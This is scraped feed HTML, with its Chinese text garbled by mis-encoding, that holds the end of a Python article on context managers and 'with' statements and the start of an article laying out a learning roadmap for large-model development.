<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> nullcontext

<span class="hljs-comment"># æœ‰æ—¶å€™ä½ æ¡ä»¶æ€§åœ°éœ€è¦ä¸Šä¸‹æ–‡ç®¡ç†å™¨</span>
context_manager = lock <span class="hljs-keyword">if</span> use_lock <span class="hljs-keyword">else</span> nullcontext()

<span class="hljs-keyword">with</span> context_manager:
    shared_operation()
</code></pre>
<h2 data-id="heading-21">æ€»ç»“</h2>
<p>è®°ä½ä¸€å¥è¯ï¼š<strong>æ¶‰åŠèµ„æºçš„è·å–å’Œé‡Šæ”¾ï¼Œå°±è€ƒè™‘ç”¨withè¯­å¥ã€‚</strong></p>
<ul>
<li>æ–‡ä»¶æ“ä½œï¼Ÿç”¨with</li>
<li>æ•°æ®åº“è¿æ¥ï¼Ÿç”¨with</li>
<li>ç½‘ç»œè¯·æ±‚ï¼Ÿç”¨with</li>
<li>çº¿ç¨‹é”ï¼Ÿç”¨with</li>
<li>ä¸´æ—¶ç›®å½•ï¼Ÿç”¨with</li>
</ul>
<p><strong>withä¸æ˜¯è¯­æ³•ç³–ï¼Œæ˜¯ä½ çš„ä¿é™©å•ã€‚</strong></p>
<p>ä¸‹æ¬¡å†çœ‹åˆ°<code>open()</code>åé¢æ²¡æœ‰<code>with</code>ï¼Œä½ å°±çŸ¥é“è¯¥è¯´ä»€ä¹ˆäº†ï¼š</p>
<p>"å…„å¼Ÿï¼Œä½ è¿™ä»£ç èƒ½è·‘ï¼Œä½†æ˜¯æˆ‘å»ºè®®ä½ ä¹°ä¸ªä¿é™©..."</p>
<hr/>
<p><strong>ä½ åœ¨é¡¹ç›®é‡Œé‡åˆ°è¿‡å“ªäº›èµ„æºæ³„æ¼çš„å‘ï¼Ÿè¯„è®ºåŒºèŠèŠï¼Œçœ‹çœ‹è°çš„æ•…äº‹æ›´æƒ¨ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025æœ€æ–°å¤§æ¨¡å‹æŠ€æœ¯å­¦ä¹ è·¯çº¿ï¼šä»å…¥é—¨åˆ°ç²¾é€šï¼Œä¸€ç¯‡æ–‡ç« å…¨æŒæ¡]]></title>    <link>https://juejin.cn/post/7580623265792688166</link>    <guid>https://juejin.cn/post/7580623265792688166</guid>    <pubDate>2025-12-08T03:07:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580623265792688166" data-draft-id="7580745065170518067" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025æœ€æ–°å¤§æ¨¡å‹æŠ€æœ¯å­¦ä¹ è·¯çº¿ï¼šä»å…¥é—¨åˆ°ç²¾é€šï¼Œä¸€ç¯‡æ–‡ç« å…¨æŒæ¡"/> <meta itemprop="keywords" content="LLM,Agent,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T03:07:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AIå¤§æ¨¡å‹"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025æœ€æ–°å¤§æ¨¡å‹æŠ€æœ¯å­¦ä¹ è·¯çº¿ï¼šä»å…¥é—¨åˆ°ç²¾é€šï¼Œä¸€ç¯‡æ–‡ç« å…¨æŒæ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AIå¤§æ¨¡å‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:07:15.000Z" title="Mon Dec 08 2025 03:07:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<p>å¤§æ¨¡å‹æŠ€æœ¯çš„åŸºç¡€å­¦ä¹ ï¼Œæ˜¯æœªæ¥åœ¨å¤§æ¨¡å‹é¢†åŸŸèƒ½å¦ç«™ç¨³è„šè·Ÿçš„å…³é”®</p>
<p>éšç€å¤§æ¨¡å‹æŠ€æœ¯çš„å‘å±•ï¼Œè¶Šæ¥è¶Šå¤šçš„äººå¼€å§‹è¿›å…¥å¤§æ¨¡å‹é¢†åŸŸï¼Œä½†å¤§æ¨¡å‹ä½œä¸ºä¸€é—¨æŠ€æœ¯ï¼Œå› æ­¤å®ƒçš„æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå·¥å…·ï¼Œå› æ­¤è¿™ä¹Ÿè®©å­¦ä¹ å¤§æ¨¡å‹æœ‰äº†ä¸åŒçš„å­¦ä¹ æ–¹å‘ã€‚</p>
<p>ä»å·¥å…·çš„è§’åº¦æ¥çœ‹ï¼Œå­¦ä¹ ä¸€ä¸ªå·¥å…·ä¸»è¦æœ‰ä¸¤ä¸ªæ–¹å‘ï¼Œä¸€ä¸ªæ˜¯ä½¿ç”¨å·¥å…·ï¼Œä¸€ä¸ªæ˜¯åˆ¶é€ å·¥å…·ï¼›è€Œä»Šå¤©æˆ‘ä»¬ä¸»è¦è®²çš„æ˜¯åè€…ï¼Œä¹Ÿå°±æ˜¯æ€ä¹ˆåˆ¶é€ ä¸€ä¸ªå¤§æ¨¡å‹å·¥å…·ï¼Œå®ƒéœ€è¦å“ªäº›æŠ€æœ¯åŸºç¡€ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<h2 data-id="heading-0">ä¸€ã€å¤§æ¨¡å‹åŸºç¡€æŠ€æœ¯è·¯çº¿â€â€â€</h2>
<p>ä¸‹é¢ä¸»è¦ä»ä»¥ä¸‹å‡ ä¸ªæŠ€æœ¯åŸºç¡€è®²è§£ä¸€ä¸‹å¤§æ¨¡å‹çš„å­¦ä¹ è·¯çº¿ï¼šâ€â€â€â€â€â€â€</p>
<ul>
<li>ç†è®ºåŸºç¡€â€</li>
<li>ç¼–ç¨‹åŸºç¡€</li>
<li>æ·±åº¦å­¦ä¹ æ¡†æ¶</li>
<li>ç‰¹å®šé¢†åŸŸçŸ¥è¯†â€â€â€â€</li>
<li>å®è·µç»éªŒ</li>
<li>ç®—æ³•åŸºç¡€</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b99401a0446486a816bef662c9fbb63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768034&amp;x-signature=eK7sBYfTE332k%2BHVHwokLvtoTvQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-1">1ã€ç†è®ºåŸºç¡€</h3>
<p>ç†è®ºåŸºç¡€æ˜¯ä¸€åˆ‡æŠ€æœ¯çš„å¼€å§‹ï¼Œå¯¹å­¦ä¹ ä¸€é—¨æŠ€æœ¯æ¥è¯´è‡³å…³é‡è¦ï¼Œæ²¡æœ‰ç†è®ºå°±æ— æ³•æŒ‡å¯¼æŠ€æœ¯çš„å‘å±•æ–¹å‘å’Œå®ç°æ–¹æ³•ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>ä»€ä¹ˆæ˜¯ç†è®ºï¼Ÿç†è®ºå…¶å®å°±æ˜¯ä¸€å¥—æè¿°å’Œè§£å†³é—®é¢˜çš„æ–¹æ³•è®ºï¼Œåªä¸è¿‡ä¸åŒçš„æŠ€æœ¯æœ‰ä¸åŒçš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ç†è®ºã€‚â€â€â€â€â€â€â€â€â€â€</p>
<p>ç†è®ºçš„å‘å±•æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºå®è·µæ£€éªŒç»“æœæ€»ç»“å‡ºæ¥çš„ç»éªŒï¼›äºŒç§æ˜¯ä»¥ä¸¥è°¨çš„ç§‘å­¦ç†è®ºæ¨å¯¼å‡ºé€»è¾‘è‡ªæ´½çš„è§£å†³æŸä¸ªé—®é¢˜çš„æ–¹æ³•ã€‚â€â€â€â€â€â€â€æ¯”å¦‚è¯´ï¼Œç«æ˜¯äººç±»ç”Ÿå­˜å’Œè¿›åŒ–çš„é‡è¦æ¡ä»¶ä¹‹ä¸€ï¼Œè€Œåœ¨è¿œå¤æ—¶æœŸäººç±»å¯¹äºç«çš„è®¤çŸ¥è¿˜æ¯”è¾ƒæµ…æ˜¾ï¼Œå› æ­¤é‚£æ—¶å…³äºç«çš„ç†è®ºä¹Ÿæ¯”è¾ƒåŸºç¡€ï¼Œæ¯”å¦‚å®ƒå¯ä»¥å–æš–ï¼Œå¯ä»¥çƒ¤ç†Ÿé£Ÿç‰©ç­‰ï¼›è¿™å°±æ˜¯åŸºäºç»éªŒçš„ç†è®ºåŸºç¡€ã€‚â€â€â€â€</p>
<p>è€Œéšç€ç§‘å­¦æŠ€æœ¯çš„å‘å±•ï¼Œäººç±»å¯¹äºç«çš„ç ”ç©¶æ›´åŠ çš„æ·±å…¥ï¼Œæ¯”å¦‚ç«çš„å½¢æ€ï¼Œç«æœ¬æ— å½¢ï¼Œä½†åˆæ˜¯æµä½“ï¼Œè€Œè¿™å°±æ˜¯åŸºäºä¸¥è°¨çš„ç§‘å­¦ç ”ç©¶å’Œç†è®ºæ¨å¯¼çš„ç»“æœã€‚â€â€é‚£å­¦ä¹ å¤§æ¨¡å‹éœ€è¦å“ªäº›ç†è®ºï¼Ÿ</p>
<p>åŸºç¡€ç†è®ºæœ‰ï¼Œäººå·¥æ™ºèƒ½çš„æ¦‚å¿µï¼Œæœºå™¨å­¦ä¹ ï¼Œæ·±åº¦å­¦ä¹ ï¼Œç¥ç»ç½‘ç»œåŸç†ï¼Œæ¿€æ´»å‡½æ•°ï¼ŒæŸå¤±å‡½æ•°ï¼Œæ­£å‘ä¼ æ’­ï¼Œåå‘ä¼ æ’­ç­‰åŸºç¡€ç†è®ºï¼Œå¯¹è¿™äº›åŸºç¡€ç†è®ºç­‰ç†è§£æ˜¯éå¸¸å¿…è¦çš„ã€‚â€â€â€â€â€â€â€æœ‰äº†ç†è®ºä¹‹åå°±èƒ½è®©ä½ çŸ¥é“å¤§æ¨¡å‹èƒ½å¹²å•¥ï¼Œä»¥åŠæ€ä¹ˆå¹²ã€‚â€â€</p>
<h3 data-id="heading-2">2ã€ç¼–ç¨‹åŸºç¡€</h3>
<p>ç¼–ç¨‹åŸºç¡€å°±ä¸ç”¨å¤šè¯´äº†ï¼Œæ‰€æœ‰çš„è®¡ç®—æœºè½¯ä»¶éƒ½æ˜¯åŸºäºç¼–ç¨‹æŠ€æœ¯å¼€å‘çš„ï¼Œå¤§æ¨¡å‹ä¹Ÿä¸ä¾‹å¤–ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€ä½†éœ€è¦è¯´çš„æ˜¯ï¼Œå¤§æ¨¡å‹å¼€å‘ä¸»è¦ä½¿ç”¨çš„æ˜¯Pythonä½œä¸ºå…¶ä¸»æµçš„å¼€å‘è¯­è¨€ï¼Œå½“ç„¶å¹¶ä¸æ˜¯è¯´å¼€å‘å¤§æ¨¡å‹å¿…é¡»ç”¨pythonï¼Œç”¨å…¶å®ƒè¯­è¨€ä¹Ÿå¯ä»¥ï¼Œæ¯•ç«Ÿè¯­è¨€åªæ˜¯å·¥å…·ï¼Œç®—æ³•æ‰æ˜¯æ ¸å¿ƒï¼›è€Œç®—æ³•æ˜¯è„±ç¦»è®¡ç®—æœºè¯­è¨€ç‹¬ç«‹å­˜åœ¨çš„ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>è¿˜æœ‰å°±æ˜¯ï¼Œå¤§æ¨¡å‹æœ¬èº«æ˜¯ä¸»è¦åŸºäºPythonå¼€å‘çš„ï¼Œä½†åŸºäºå¤§æ¨¡å‹æ„å»ºä¸Šå±‚åº”ç”¨å¯ä»¥ä½¿ç”¨å…¶å®ƒå·¥ç¨‹æ€§è¯­è¨€ï¼Œæ¯”å¦‚Javaï¼ŒGoï¼ŒRustç­‰ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨Pythonã€‚â€â€â€â€â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4641b097341e401596b21488bc6ef4b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768034&amp;x-signature=fF2yft6HSAXmO7oAXKcV3QvrFWw%3D" alt="" loading="lazy"/></p>
<p>å¤§æ¨¡å‹ä½œä¸ºä¸€ä¸ªæœåŠ¡ï¼Œä¸€èˆ¬ç”±Pythonå¼€å‘ï¼Œç„¶åå°è£…æˆå¯¹å¤–æ¥å£ï¼Œç„¶åä½¿ç”¨å…¶å®ƒå¼€å‘è¯­è¨€è°ƒç”¨æ„å»ºä¸Šå±‚åº”ç”¨ã€‚â€â€</p>
<h3 data-id="heading-3">3ã€æ·±åº¦å­¦ä¹ æ¡†æ¶</h3>
<p>ä»€ä¹ˆæ˜¯æ¡†æ¶ï¼Ÿâ€</p>
<p>æ¡†æ¶å°±ç±»ä¼¼äºæ¨¡å…·ï¼Œå¤§æ¨¡å‹æ˜¯ä¸€ä¸ªéå¸¸å¤æ‚çš„ç³»ç»Ÿæ€§å·¥ç¨‹ï¼Œä»0å¼€å§‹æ„å»ºéš¾åº¦éå¸¸å¤§ï¼Œå› æ­¤å°±æœ‰äº†ä¸€äº›å¼€æºæ¡†æ¶æ¥å¤„ç†ä¸€äº›åŸºç¡€æ€§å·¥ä½œå’Œä¸€äº›å¸¸ç”¨çš„å·¥å…·ã€‚â€â€â€â€â€â€â€â€æ¯”å¦‚è¯´æ•°æ®å¤„ç†ï¼Œåœ¨å¤§æ¨¡å‹æŠ€æœ¯ä¸­æ•°æ®å¤„ç†æ˜¯éå¸¸é‡è¦çš„ä¸€ç¯ï¼Œä½†é¢å¯¹å¤æ‚çš„æ•°æ®ç§ç±»ä»¥åŠæ•°æ®æ ¼å¼ï¼Œå¦‚æœå…¨éƒ¨è‡ªå·±æ‰‹åŠ¨å¤„ç†å°†æ˜¯ä¸€ä¸ªå·¨å¤§çš„å·¥ç¨‹é‡ï¼›å› æ­¤ä¸ºäº†æé«˜å¼€å‘æ•ˆç‡ï¼Œæ’é™¤è¿™äº›å¤–åœ¨å¹²æ‰°ï¼Œè®©æŠ€æœ¯äººå‘˜æŠŠå¿ƒæ€æ”¾åœ¨å¤§æ¨¡å‹çš„æ ¸å¿ƒèŠ‚ç‚¹ä¸Šï¼Œæ¡†æ¶å°±å‡ºç°äº†ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>è¿˜æœ‰å°±æ˜¯ï¼Œè¿™äº›æ·±åº¦å­¦ä¹ æ¡†æ¶ä¸€èˆ¬ä¼šå†…ç½®ä¸€äº›ç»å…¸æ¶æ„çš„å®ç°ï¼Œæ¯”å¦‚Transformeræ¶æ„ï¼Œå’Œä¸€äº›å¸¸è§çš„ç¥ç»ç½‘ç»œæ¨¡å‹ï¼Œæ¯”å¦‚CNNå’ŒRNNï¼Œè¿™æ ·å¯¹ä¸€äº›åˆå­¦è€…å°±å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›å·¥å…·æ„å»ºå±äºè‡ªå·±çš„å¤§æ¨¡å‹ã€‚â€â€â€â€â€â€â€â€â€â€â€å¸¸è§çš„æ·±åº¦å­¦ä¹ æ¡†æ¶ï¼Œå¦‚PyTorchï¼ŒTensorflowç­‰ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<h3 data-id="heading-4">4ã€ç‰¹å®šé¢†åŸŸçš„çŸ¥è¯†</h3>
<p>å¤§æ¨¡å‹æ˜¯ä¸€ä¸ªéå¸¸ç¬¼ç»Ÿçš„æŠ€æœ¯ï¼Œä½†ç»†åˆ†ä¸‹å»åˆæœ‰å¤šç§ä¸åŒçš„æ–¹å‘ï¼Œæ¯”å¦‚è¯´è‡ªç„¶è¯­è¨€å¤„ç†ï¼Œè®¡ç®—æœºè§†è§‰ç­‰ã€‚æ¯•ç«Ÿå¤§æ¨¡å‹ä¹Ÿæ˜¯ç”¨æ¥è§£å†³é—®é¢˜çš„ï¼Œå¦‚æœå¤§æ¨¡å‹æ²¡æœ‰å…·ä½“çš„è½è„šç‚¹ï¼Œé‚£ä¹ˆå®ƒå°±æˆä¸ºäº†ä¸€ä¸ªçº¯ç†è®ºæ€§è´¨çš„ç ”ç©¶ï¼Œè¿™æ ·å®ƒå°±å¤±å»äº†åº”æœ‰çš„ä»·å€¼ã€‚â€â€â€</p>
<p>è€Œä¸è®ºæ˜¯è‡ªç„¶è¯­è¨€å¤„ç†ï¼Œè¿˜æ˜¯è®¡ç®—æœºè§†è§‰éƒ½æ˜¯ç‹¬ç«‹çš„åº”ç”¨é¢†åŸŸï¼Œå®ƒä»¬å’Œå¤§æ¨¡å‹çš„å…³ç³»å°±æ˜¯å¤§æ¨¡å‹å¯ä»¥ä½œä¸ºå…¶ç ”ç©¶çš„ä¸€ä¸ªæ–¹æ³•æˆ–æ‰‹æ®µï¼Œæ²¡æœ‰å¤§æ¨¡å‹ä¹Ÿå¯ä»¥ç ”ç©¶è‡ªç„¶è¯­è¨€å¤„ç†å’Œè®¡ç®—æœºè§†è§‰ï¼›ä½†è‡ªç„¶è¯­è¨€å¤„ç†å’Œè®¡ç®—æœºè§†è§‰å¯ä»¥åˆ©ç”¨å¤§æ¨¡å‹è¿›è¡Œæ›´åŠ é«˜æ•ˆçš„ç ”ç©¶ã€‚â€â€â€â€</p>
<p>å› æ­¤ï¼Œå¦‚æœåªæ˜¯å•çº¯çš„å­¦ä¹ å¤§æ¨¡å‹æŠ€æœ¯ï¼Œä¸ä¸è¿™äº›å…·ä½“çš„åº”ç”¨é¢†åŸŸç›¸ç»“åˆï¼Œé‚£ä¹ˆå­¦ä¹ å¤§æ¨¡å‹æŠ€æœ¯å°±å¤±å»äº†åº”æœ‰çš„æ„ä¹‰ã€‚â€â€â€â€â€â€â€è€Œç”¨å¤§æ¨¡å‹å»ç ”ç©¶è¿™äº›åº”ç”¨é¢†åŸŸï¼Œæˆ–è€…è¯´ç”¨å¤§æ¨¡å‹ä½œä¸ºè§£å†³è¿™äº›é¢†åŸŸçš„ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆå°±éœ€è¦æœ‰å¯¹åº”é¢†åŸŸçš„åŸºç¡€çŸ¥è¯†ï¼Œåªæœ‰å¤§æ¨¡å‹æœ¬èº«çš„æŠ€æœ¯æ˜¯è¿œè¿œä¸å¤Ÿçš„ã€‚â€â€â€â€è‡ªç„¶è¯­è¨€å¤„ç†æ‰€æ¶‰åŠçš„çŸ¥è¯†æœ‰è¯­è¨€åˆ†æï¼Œè¯­ä¹‰åˆ†æï¼Œåˆ†è¯ï¼Œè‡ªç„¶è¯­è¨€ç†è§£ï¼Œè‡ªç„¶è¯­è¨€ç”Ÿæˆç­‰ã€‚â€â€â€â€â€â€â€â€â€</p>
<h3 data-id="heading-5">5ã€å®è·µç»éªŒ</h3>
<p>å®è·µ å®è·µ å†å®è·µï¼Œé‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼ï¼ï¼â€â€â€â€</p>
<p>å¤§æ¨¡å‹æŠ€æœ¯æ˜¯ä¸€é¡¹å®æ“æ€§å¾ˆå¼ºçš„æŠ€æœ¯ï¼Œæˆ–è€…è¯´ä»»ä½•æŠ€æœ¯éƒ½ç¦»ä¸å¼€å®æ“ï¼Œçº¯ç²¹çš„ç†è®ºç ”ç©¶ç»ˆç©¶åªæ˜¯ç©ºä¸­æ¥¼é˜ã€‚â€â€â€â€â€â€</p>
<p>ä»å­¦ä¹ æ–¹æ³•çš„è§’åº¦æ¥è¯´ï¼Œç†è®ºåº”è¯¥ä¸å®è·µç›¸ç»“åˆï¼Œå¾ˆå¤šäººåœ¨å­¦ä¹ ç†è®ºçš„è¿‡ç¨‹ä¸­æ€»å–œæ¬¢æ‰“ç ´ç ‚é”…é—®åˆ°åº•ï¼Œé’»è¿›ç†è®ºä¸­å‡ºä¸æ¥ã€‚â€â€â€â€â€â€â€å½“ç„¶ï¼Œå¹¶ä¸æ˜¯è¯´æ‰“ç ´ç ‚é”…é—®åˆ°åº•ä¸å¥½ï¼Œä½œä¸ºæŠ€æœ¯ç ”ç©¶äººå‘˜æœ‰å¿…é¡»è¦æœ‰æ‰“ç ´ç ‚é”…é—®åˆ°åº•çš„å†³å¿ƒã€‚â€â€</p>
